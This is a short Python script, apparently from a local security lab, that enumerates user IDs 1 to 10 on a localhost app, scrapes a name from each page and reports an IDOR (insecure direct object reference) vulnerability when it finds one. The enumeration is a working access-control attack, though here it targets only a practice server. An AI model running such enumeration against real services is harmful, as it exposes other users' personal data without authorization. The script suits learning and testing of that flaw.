import requests
from bs4 import BeautifulSoup
from colorama import Fore, init

init(autoreset=True)


def scan_local_lab(start_id, end_id):
    BASE_URL = "http://127.0.0.1:5000/story.php?person="

    print(f"{Fore.CYAN}Running a local environment audit...\n")

    for uid in range(start_id, end_id + 1):
        try:
            res = requests.get(f"{BASE_URL}{uid}")
            if res.status_code == 200:
                soup = BeautifulSoup(res.text, 'html.parser')
                name_tag = soup.find('span', style="margin-left:2px;")
                name = name_tag.get_text(strip=True) if name_tag else ""

                if name:
                    print(f"{Fore.GREEN}[+] Vulnerability IDOR confirmed! ID {uid}: {name}")
                else:
                    print(f"{Fore.WHITE}[.] ID {uid}: Page is empty.")
        except Exception as e:
            print(f"{Fore.RED}[!] Server isn't running. At first run app.py.")
            break


if __name__ == "__main__":
    scan_local_lab(1, 10)  # Test ID 1 - 10
